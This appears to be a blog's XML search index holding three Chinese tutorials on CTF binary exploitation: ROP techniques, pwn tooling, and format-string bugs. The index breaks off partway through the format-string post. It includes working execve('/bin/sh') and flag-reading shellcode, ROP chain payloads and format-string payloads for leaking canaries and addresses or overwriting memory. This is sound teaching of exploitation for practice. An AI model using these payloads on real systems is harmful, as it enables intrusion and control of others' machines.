<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ret2xxx</title>
      <link href="/wlt/2024/07/12/ret2xxx/"/>
      <url>/wlt/2024/07/12/ret2xxx/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出漏洞利用一，详解基本ROP，构造rop链条实现攻击"><a href="#栈溢出漏洞利用一，详解基本ROP，构造rop链条实现攻击" class="headerlink" title="栈溢出漏洞利用一，详解基本ROP，构造rop链条实现攻击"></a>栈溢出漏洞利用一，详解基本ROP，构造rop链条实现攻击</h1><p>目前被广泛使用的攻击手法是 返回导向编程 (Return Oriented Programming)，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p><p>gadgets 通常是以 ret 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p><p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p><p>使用 ROP 攻击一般得满足如下条件：</p><p>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</p><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p><p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p><p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。</p><h2 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="1.ret2text"></a>1.ret2text</h2><p>这种攻击手法是最最常见也是最基础的攻击手法，就是直接打程序给的后门函数就行</p><p>太简单了，没必要细讲，直接劫持返回地址到后门函数就可以了，有时候打不通就是栈迁移的问题</p><p>ubuntu16没有栈对齐，64位，版本18以上就有栈对齐了，执行system函数的时候要让栈是对齐的状态，在执行system函数之前再pop，ret一次就好了，或者p64（system的地址+1），从加1一直到加8，手动让他对齐</p><h2 id="2-shellcode注入"><a href="#2-shellcode注入" class="headerlink" title="2.shellcode注入"></a>2.shellcode注入</h2><p>在更简单的一类题目ret2text中，我们主要的尝试是修改某个返回地址修改，修改到程序固有的后门函数处，劫持程序控制流以期返回后门。然而，如果程序中并不存在这样的后门函数，那么很朴素的想法是，能不能自己写一段后门函数，然后劫持程序控制流返回执行这段恶意代码呢？</p><p>可以的，这就可以用到shellcode注入</p><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><p>需要注意的是，在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用。</p><p>本来其实这个对汇编的要求很高，需要自己手写shellcode的汇编代码，但是有craft这个集成化工具，可以自动帮你写好shellcode，直接用就行，但是依旧是那句话，最开始最好是理解真正的原理是什么，不要直接用这个工具，所以例题讲解就只讲手写汇编代码，汇编的基础的话这里就稍微提一点最重要的就行：</p><p>mov rax, 0x50<br>翻译：将0x50这个十六进制数赋值给rax寄存器。若rax原本值为0x40，mov rax, 0x50后则变为0x50<br>寄存器：一个临时储存数据的东西</p><p>add rax, 0x50<br>翻译：将0x50这个十六进制数加到rax寄存器。若rax原本值为0x40，add rax, 0x50后则变为0x90</p><p>push rax<br>翻译：将rax中的值推进栈中<br>栈：一个临时储存数据的东西</p><p>pop rax<br>翻译：将栈中此时储存的数据拿出放进rax中</p><p>xor al，0x50<br>翻译：对al寄存器中的数进行“异或”操作，与0x50进行异或。<br>al寄存器：rax寄存器一共有8个字节：11 22 33 44 55 66 77 88，al就是的最低的1个字节，也就是88的那个字节。ah是77的那个字节，ax是77 88，eax是55 66 77 88。<br>异或：<br>0x50是十六进制数，转化为二进制数是0101 0000<br>假设此时al中的数为0x10，转化为二进制数是0001 0000<br>0101 0000<br>0001 0000<br>上下对每个比特进行比较，如果相同，则为0，不同，则为1。第一个比特，相同，所以结果为0。第二个比特，不同，所以结果为1，如此比较下去，得到结果：<br>0100 0000<br>这个值为0x40就是最终的结果。<br>需要注意的是，异或并不代表是相减，只是这里刚好是相减的值而已，异或有时候不会是相减的值！<br>一个数，异或同一个数两次，会回到原来的这个数。<br>例如将刚刚的0x40再异或0x10一次，又会变回0x50</p><p>xor eax, dword ptr [rdx + 0x30]<br>翻译：将rdx寄存器中储存的地址加0x30后，取这个地址中储存的值，将这个值与eax进行异或。<br>rdx寄存器：寄存器的一种。<br>dword ptr [ ]：指针。指向某个地址中的值。例如，在0x66660000这个地址中存放了一个值，这个值是0x1234，那么取的就是这个0x1234，而不是0x66660000，如果是xor eax, rdx + 0x30，取的就是这个0x66660000</p><p>xor al, byte ptr [rdx + 0x30]<br>翻译：将rdx寄存器中储存的地址加0x30后，取这个地址中储存的值，将这个值与al进行异或。<br>与上面的不同点：byte和al。byte和al代表取一个字节，dword和eax代表取四个字节。此外，还有word和ax（两个字节），qword和rax（八个字节）。如果该地址中的值为：11 22 33 44 55 66 77 88，byte取的是88，将0x88与al寄存器异或。word取的是77 88，dword取的是55 66 77 88，qowrd取全部。</p><p>讲下32位的shellcode怎么编写</p><p>前置知识：</p><p>①对于32位程序而言，我们最后系统调用采用的并不是syscall，而是int 0x80</p><p>②我们传参的前三个寄存器分别是ebx,ecx,edx</p><p>③32位的execve系统调用号是11，并且存储系统调用后的寄存器是eax。32位的系统调用号可以查看这个文件&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</p><p>首先是</p><pre><code>xor ecx,ecxxor edx,edx</code></pre><p>清空两个参数为0的寄存器</p><p>然后是</p><pre><code>xor ebx,ebx push ebxpush 0x68732f2fpush 0x6e69622fmov ebx,esp</code></pre><p>此时把参数&#x2F;bin&#x2F;sh压入栈，最开始push ebx是先压入栈中一个0，用来字符串截断。最后将esp指向的地址赋给了ebx，此时ebx的值就是&#x2F;bin&#x2F;sh的地址。</p><p>最后是</p><pre><code>xor eax,eaxpush 11pop eaxint 0x80</code></pre><p>现在是把系统调用号存进去并且进行了系统调用</p><p>最后把这三部分结合一下效果如下。</p><pre><code>xor ecx,ecxxor edx,edxxor ebx,ebx push ebxpush 0x68732f2fpush 0x6e69622fmov ebx,espxor eax,eaxpush 11pop eaxint 0x80</code></pre><p>根据64位的特点也可以编写64位的shellcode,大体思路也是相同的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push <span class="number">0x3b</span></span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,<span class="number">0x68732f6e69622f</span></span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>手写打orw的shellcode</p><p>64位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mov esi,0</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov edx,0x100</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>64位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，</span><br><span class="line">#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个栈地址具体是多少</span><br><span class="line">#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址具体是什么并不重要（只要不会导致堆栈崩溃的话）</span><br><span class="line">#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的</span><br><span class="line">#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来是32位的，32位和64位编写的区别主要是<strong>寄存器不同</strong>和<strong>系统调用号不同</strong>，另外就是<strong>再压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（64位不需要push 0的原因是存入的’flag’不足8字节，会自动添加00来截断）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="3-ret2syscall"><a href="#3-ret2syscall" class="headerlink" title="3.ret2syscall"></a>3.ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取 shell</p><p>ret2syscall通常采用execve（重点函数，32位调用号为0x0b，64位调用号为0x3b）<br>ROP</p><p>Return Oriented Programming,其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p><p>一般的栈结构：<br>      高地址                          +—————–+<br>                                           |     retaddr     |<br>                                           +—————–+<br>                                           |    saved ebp |<br>                               ebp—&gt;+—————–+<br>                                           |                     |<br>                                           |                     |<br>                                           |                     |<br>                                           |                     |<br>                                           |                     |<br>                                           |                     |<br>      低地址               esp–&gt;+—————–+</p><p>Gadgets<br>以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>ROP 攻击一般得满足如下条件</p><p>程序存在溢出，并且可以控制返回地址。<br>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。<br>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><p>每一个gadgets都含有ret是为了能够使得程序自动持续的选择堆栈中的指令依次执行</p><p>ret指令可以理解成取栈顶的数据作为下次跳转的位置。即，</p><p>eip &#x3D; [esp];</p><p>esp &#x3D; esp+4;</p><p>ret 修改eip 和 esp的值</p><p>或者简单理解成： pop eip; （pop指令会附加esp的移动，意思是取栈顶的数据作为下次跳转的位置）然后执行 jump</p><p>相比之下，call指令即 ：push eip;（此时eip为call指令的下一条指令的地址，意思是将call指令的下一条指令地址压入栈） 然后 jump</p><p>函数返回时通常会执行下列指令</p><p>mov esp ,ebp<br>pop ebp  上述两条指令使ebp , esp指向原来的栈，此时esp指向返回地址<br>ret      使eip变为返回地址，然后jmp<br>Linux系统调用的实现<br>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p><p>应用程序调用库函数（API）；<br>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；<br>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；<br>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；<br>中断处理函数返回到 API 中；<br>API 将 EAX 返回给应用程序。<br>应用程序调用系统调用的过程是：</p><p>把系统调用的编号存入 EAX；<br>把函数参数存入其它通用寄存器；<br>触发 0x80 号中断（int 0x80）。<br>Syscall的函数调用规范为：execve(“&#x2F;bin&#x2F;sh”, 0,0);</p><p>所以，eax &#x3D; 0xb | ebx &#x3D; address 0f ‘&#x2F;bin&#x2F;sh’ | ecx &#x3D; 0 | edx &#x3D; 0</p><p>它对应的汇编代码为：</p><p>pop eax# 系统调用号载入， execve为0xb，在linux系统中，函数的调用是有一个系统调用号的。我们实验要调用的execve(“&#x2F;bin&#x2F;sh”,null,null)函数其系统调用号是11，即十六进制0xb。<br>pop ebx# 第一个参数， &#x2F;bin&#x2F;sh的string<br>pop ecx# 第二个参数，0<br>pop edx# 第三个参数，0<br>int 0x80</p><p> 可以理解为拼接成一个系统调用的栈。</p><p>在eax、ebx、ecx、edx中带入指定的参数拼接成关键的系统函数，最后在寻找int 0x80的地址，从而执行这些函数.</p><p>顺序</p><p>32位</p><p>eax-&gt;edx-&gt;ecx-&gt;ebx</p><p>64位</p><p>rdi-&gt;rsi-&gt;rdx-&gt;rcx-&gt;r8-&gt;r9</p><p>按照上面原理的分析构造payload</p><p>32位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*padding+p32(pop_eax_ret)+p32(0xb)+ p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br></pre></td></tr></table></figure><p>64位:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;* padding + p64(rax_ret)+ p64(0x3b) + p64(rdi_ret)+ p64(binsh_addr)+ p64(rdx_rsi_ret)+ p64(0)+ p64(0) + p64(syscall_ret) + p64(0)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/wlt/2024/07/12/tools/"/>
      <url>/wlt/2024/07/12/tools/</url>
      
        <content type="html"><![CDATA[<h1 id="破界圣剑—pwn常用且好用的工具使用分享（持续更新）"><a href="#破界圣剑—pwn常用且好用的工具使用分享（持续更新）" class="headerlink" title="破界圣剑—pwn常用且好用的工具使用分享（持续更新）"></a>破界圣剑—pwn常用且好用的工具使用分享（持续更新）</h1><h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>！一个好的工具，就如同魔法师手中的魔杖，能够助你轻松驾驭复杂之事，它必须具备三大要素：一是威力无穷，如同烈火焚烧万物；二是灵巧便捷，如同风中之叶，轻盈自如；三是持久耐用，如同山岳般稳固，历久弥新。这样的工具，才能称之为真正的好工具！<br>工具分享：</p><h2 id="一，one-gadget"><a href="#一，one-gadget" class="headerlink" title="一，one_gadget"></a>一，one_gadget</h2><p>功能：查找已知的libc中exevce(“&#x2F;bin&#x2F;sh”)语句的地址</p><p>用法: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-x.xx.so</span><br></pre></td></tr></table></figure><h2 id="二：clibc"><a href="#二：clibc" class="headerlink" title="二：clibc"></a>二：clibc</h2><p>功能：配置本地的libc环境和远程相同</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clibc pwn 2.23</span><br></pre></td></tr></table></figure><h2 id="三：search-libc"><a href="#三：search-libc" class="headerlink" title="三：search-libc"></a>三：search-libc</h2><p>匹配libc版本的神器，通过泄露的函数的值自动搜索好对方服务器所有可能的libc，然后一一列出来提供自己选择，一键搞定。</p><p>用ret2libc攻击手法最难受的就是不知道对方的服务器的libc是什么，每次泄露出来的函数还得暂停调试，然后打印出泄露出来的函数的值，再然后去对应的网站上面搜索，每次都会有十多个版本，又要一个一个下，还要一个一个导入脚本当中，再一个一个尝试直到测到正确的版本，太麻烦了，直接自动化给你搜索好，你只需要在它自动搜索后列出来的0-n个版本中输入数字自己选取就可以一键搞定。</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br></pre></td></tr></table></figure><h2 id="四：IDA"><a href="#四：IDA" class="headerlink" title="四：IDA"></a>四：IDA</h2><p>一、IDA是什么？<br>          IDA全称是交互式反汇编器专业版（Interactive Disassembler Professional），人们其简称为IDA，是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器！IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或Linux WinCE MacOS平台主机来分析程序。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。它支持数十种CPU指令集其中包括Intel x86，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等。</p><p>IDA怎么使用呢？这里给出我的经验总结快捷键：</p><p>1.F5    把晦涩难弄的汇编语言转化成通俗易懂的c语言伪代码，简称F5大法<br>2.shift+F12     自动分析出参考字符串，可以看下有没有直接的自动识别出来的后门可以打<br>3.按空格       反汇编窗口切换文本和图形<br>4.按TAB键     其实就是返回上一步操作的键<br>5.CTRL+s      列举出二进制程序的段的开始地址，结束地址等</p><p>6.CTRL + x     跟进字符串所在的函数</p><p>7.CTRL + T    搜索字符串</p><p>8.&#x2F;     进行注释</p><h2 id="五：pwntools"><a href="#五：pwntools" class="headerlink" title="五：pwntools"></a>五：pwntools</h2><p>Pwntools是一个CTF框架和漏洞利用开发库，里面有很多小工具可以使用，还有很多封装好的函数可以用，大大的有利于我们编写脚本</p><p>依旧是给出我的使用经验的总结：</p><p>1.asm:   汇编与反汇编</p><p>2.dynelf:   远程符号泄露</p><p>3.elf:   elf文件操作</p><p>4.gdb:     启用gdb调试</p><p>5.craft:      shellcode的自动生成器</p><p>6.process&#x2F;remote:     本地连接程序打&#x2F;远程连接程序打</p><p>7.cyclic  pattern:     偏移量的计算</p><h2 id="六：pwndbg"><a href="#六：pwndbg" class="headerlink" title="六：pwndbg"></a>六：pwndbg</h2><p>1.break:   设置断点</p><p>2.run:    启动程序</p><p>3.continue:     继续执行程序</p><p>4.next:     单步执行程序，跳过函数调用</p><p>5.step:      单步执行程序，进入函数调用</p><p>6.vmmap:     显示进程的虚拟内存的映射</p><p>7.quit:    退出gdb</p><h2 id="七：ROPgadget"><a href="#七：ROPgadget" class="headerlink" title="七：ROPgadget"></a>七：ROPgadget</h2><p>ROPgadget这个工具允许你在二进制文件中搜索代码gadget片段，大大的有利于基本ROP攻击的利用。ROPgadget支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS架构上的ELF&#x2F;PE&#x2F;Mach-O格式。</p><p>它可以对你锁定的程序自动抓取你想要的东西，然后列出来所有的供你选择，直接选取需要用到的gadget片段就行了</p><p>使用示例：</p><p>查找可存储寄存器的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure><p>查找字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>查找有int 0x80的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure><h2 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h2><p>一个剑客怎么能少了一柄好剑呢？持续更新ing</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fmt</title>
      <link href="/wlt/2024/07/10/fmt/"/>
      <url>/wlt/2024/07/10/fmt/</url>
      
        <content type="html"><![CDATA[<h1 id="栈上的格式化字符串漏洞的七种利用"><a href="#栈上的格式化字符串漏洞的七种利用" class="headerlink" title="栈上的格式化字符串漏洞的七种利用"></a>栈上的格式化字符串漏洞的七种利用</h1><h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>格式化字符串漏洞由于目前编译器的默认禁止敏感格式控制符，而且容易通过代码审计中发现，所以此类漏洞现在已经极少出现了。</p><p>所以格式化字符串漏洞在实际利用过程中现在几乎挖掘不到了，但是在CTF的pwn题中，由于其可以结合其他溢出漏洞利用，还是经常会遇到格式化字符串漏洞的。</p><p>格式化字符串漏洞最早被Tymm Twillman在1999年发现，当时并未引起重视。在tf8的一份针对wu-ftpd格式化字符串漏洞实现任意代码执行的漏洞的报告之后（详情可参阅 《黑客攻防技术宝典-系统实战篇》），才让人们意识到它的危害，至此而发现了大量的相关漏洞。</p><p><strong>格式化字符串漏洞的产生根源主要源于对用 户输入未进行过滤，这些输入数据都作为数据传递给某些执行格式化操作的函数，如printf，sprintf，vprintf，vprintf。恶意用户 可以使用”%s”,”%x”，“%p”来得到堆栈的数据，甚至可以通过”%n”来对任意地址进行读写，导致任意代码读写。</strong></p><p>一般掌握好“%n”和“%p”的利用就差不多了</p><h2 id="作用一："><a href="#作用一：" class="headerlink" title="作用一："></a>作用一：</h2><p>可以改写一个变量的值的大小，比如改写变量x的大小为任意你想要的值</p><p>小范围修改：</p><p>看下面的伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read(0,buf,0x20u);</span><br><span class="line">printf(buf)；</span><br><span class="line">if( x == 5 );</span><br><span class="line">   welcome();</span><br><span class="line">else</span><br><span class="line">   printf(&quot;Okay, excuse me.&quot;)</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里正常来说条件是不可能成立的，因为程序自己已经设定好了x的值为3,但是我们可以通过格式化字符串的漏洞改写变量x的值为5，使这个If条件成立，跳转到welcome这个漏洞函数里面去</p><p>依旧是以32位程序为例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(0x804C030) + b&#x27;%1c&#x27; + b&#x27;%4$n&#x27;</span><br></pre></td></tr></table></figure><p>通过这个payload就可以改写x的值为5，从而使这个If条件成立，跳转到welcome这个漏洞函数里面去</p><p>大范围修改：</p><p>这个就需要自己去调试和真正理解这个格式化字符串的原理了，这里给出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&#123;&#125;c&quot;.format(str(value)).encode() + b&quot;%n$n&quot;</span><br><span class="line"></span><br><span class="line">payload=(b&#x27;%&#x27;+str(one_gadget&gt;&gt;padding&amp;amp;0xffff).encode()+b&#x27;c%n$hn&#x27;).ljust(padding,b&#x27;\x00&#x27;)</span><br></pre></td></tr></table></figure><p>记得加上地址。</p><p>其实啊，这个也可以一键修改好你想要的值</p><p>就是pwntools小工具里面有这个写好的函数原型可以直接用，填入偏移，数据和地址就可以直接修改好，不过刚开始还是自己理解原理为最好，不要太依赖这个。</p><h2 id="作用二："><a href="#作用二：" class="headerlink" title="作用二："></a>作用二：</h2><p>泄露函数实际的地址</p><p>其实格式化字符串漏洞也可以泄露出来函数实际地址，然后根据固定公式，就可以计算出来Libc的基地址，这也是我最近才学习到的新方法，常规的泄露libc基地址的方法可以见我在CSDN上面的博客：<a href="https://blog.csdn.net/2402_83422357/article/details/139154370?spm=1001.2014.3001.5501">https://blog.csdn.net/2402_83422357/article/details/139154370?spm=1001.2014.3001.5501</a></p><p>脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload =  &#x27;.%n$p&#x27;</span><br><span class="line"> p.sendline(payload)</span><br><span class="line"> p.recvuntil(&#x27;.&#x27;)</span><br><span class="line"> leak = int(p.recv(10),16) - padding</span><br></pre></td></tr></table></figure><h2 id="作用三："><a href="#作用三：" class="headerlink" title="作用三："></a>作用三：</h2><p>泄露pie基地址从而绕过pie保护机制</p><p>脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;.%n$p&#x27;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;.&#x27;)</span><br><span class="line"> pie_base = int(p.recv(14),16) - padding - base</span><br></pre></td></tr></table></figure><h2 id="作用四："><a href="#作用四：" class="headerlink" title="作用四："></a>作用四：</h2><p>泄露canary从而绕过canary保护机制</p><p>脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;aaaa%n$p&#x27;</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">canary = int(p.recvuntil(&#x27;00&#x27;),16)</span><br><span class="line"></span><br><span class="line">log.success(&#x27;canary:&#x27; + hex(canary))</span><br></pre></td></tr></table></figure><h2 id="作用五："><a href="#作用五：" class="headerlink" 